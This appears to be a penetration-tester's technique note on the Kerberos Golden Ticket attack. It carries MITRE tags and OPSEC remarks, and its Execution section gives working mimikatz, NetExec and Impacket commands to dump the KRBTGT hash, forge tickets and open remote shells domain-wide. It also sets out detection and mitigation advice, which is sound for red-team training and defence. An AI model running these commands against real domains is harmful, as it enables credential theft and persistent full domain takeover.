---
tags:
  - "#type/technique"
  - "#tactic/TA0004"
  - "#tactic/TA0003"
  - "#technique/T1558.001"
  - "#stage/privilege-escalation"
  - "#stage/persistence"
  - "#os/windows"
  - "#tool/mimikatz"
  - "#tool/impacket"
  - "#protocol/kerberos"
  - "#tool/netexec"
aliases:
  - Golden Ticket Attack
  - Forged Kerberos Tickets
  - KRBTGT Abuse
---

## Technique
___

A Golden Ticket attack involves forging a Kerberos Ticket Granting Ticket (TGT) using the KRBTGT account's NTLM hash or AES key. The KRBTGT account is a special account used by the Key Distribution Center (KDC) to encrypt and sign all Kerberos tickets within a domain.

With a forged Golden Ticket, an attacker can impersonate any user in the domain, including domain administrators and other privileged accounts. This provides complete and persistent access to the Active Directory domain, allowing the attacker to authenticate to any service or system within the domain without valid credentials.

## Prerequisites
___

**Access Level:** The attacker must have already obtained the KRBTGT account's password hash, typically through methods like DCSync, domain controller compromise, or NTDS.dit extraction.

**Information Needed:**
- Domain SID (Security Identifier)
- KRBTGT account NTLM hash or AES key
- Domain name (FQDN)

## Considerations
___

**Impact**

A Golden Ticket attack provides complete and persistent access to the Active Directory domain, allowing the attacker to:
- Impersonate any user, including Domain Admins
- Access any resource in the domain
- Create backdoor accounts
- Persist indefinitely (or until the KRBTGT password is reset twice)

**OPSEC**

- Golden Tickets can be configured with extremely long validity periods (up to 10 years)
- Activity using Golden Tickets may bypass typical authentication logs
- Advanced monitoring solutions may detect unusual Kerberos TGT issuance or usage patterns
- The attack may generate unusual Kerberos traffic from non-domain controller systems

## Execution
___

### 1. Obtain the Domain SID

#### Locally (from a domain-joined Windows machine):
```powershell
(Get-ADDomain).DomainSID
```

or

```cmd
whoami /user
```
(Domain SID is the part before the last hyphen (RID))

#### Remotely:
```bash
nxc ldap <target> -u <user> -p <pass> --sid
```

### 2. Obtain the KRBTGT Account Hash

#### Locally using Mimikatz:
```powershell
lsadump::lsa /inject /name:krbtgt
```

#### Remotely using NetExec:
```bash
nxc smb <dcip> --local-auth -u '' -p '' --lsa --user krbtgt
nxc smb <dcip> --local-auth -u '' -p '' --ntds --user krbtgt
```

#### Remotely using Impacket:
```bash
impacket-secretsdump user:pass@10.0.0.35
```

### 3. Generate and Use the Golden Ticket

#### Using Mimikatz:
```powershell
# Generate and inject the ticket into current session
kerberos::golden /User:Administrator /domain:domain.local /sid:<SID> /krbtgt:<krbtgt hash> /id:500 /ptt

# Spawn a command shell with the ticket
misc::cmd
```

Now you can use PsExec or other tools to access any system in the domain:
```powershell
psexec.exe -accepteula \\hostname cmd.exe
```

#### Using Impacket:
```bash
# Generate the ticket file
impacket-ticketer -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> <user_name>

# Or with AES key
impacket-ticketer -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> <user_name>
```

Set the ticket environment variable:
```bash
export KRB5CCNAME=<TGS_ccache_file>
```

Then access any system in the domain:
```bash
impacket-psexec <domain_name>/<user_name>@<remote_hostname> -k -no-pass
impacket-wmiexec <domain_name>/<user_name>@<remote_hostname> -k -no-pass
impacket-smbexec <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```

## Cleanup Considerations
___

- Golden Tickets remain valid until the KRBTGT password is reset twice
- No direct cleanup is needed after using Golden Tickets
- The activity will leave traces in various logs depending on what actions were performed

## Detection & Mitigation
___

### Detection

- Monitor for TGT requests that don't match expected encryption types
- Look for authentication from unusual source systems
- Check for tickets with abnormally long validity periods (default is 10 hours)
- Monitor for signs of forged PACs (Privilege Attribute Certificates)
- Watch for increased privileged activity from accounts that normally don't exhibit such behavior

### Mitigation

- Reset the KRBTGT account password twice (to invalidate all existing tickets)
- Implement regular password rotation for the KRBTGT account
- Monitor and strictly limit administrative access to domain controllers
- Implement advanced monitoring for Kerberos anomalies
- Use Protected Users security group for privileged accounts
- Implement time-based restrictions on privileged account usage
- Consider implementing a tiered administrative model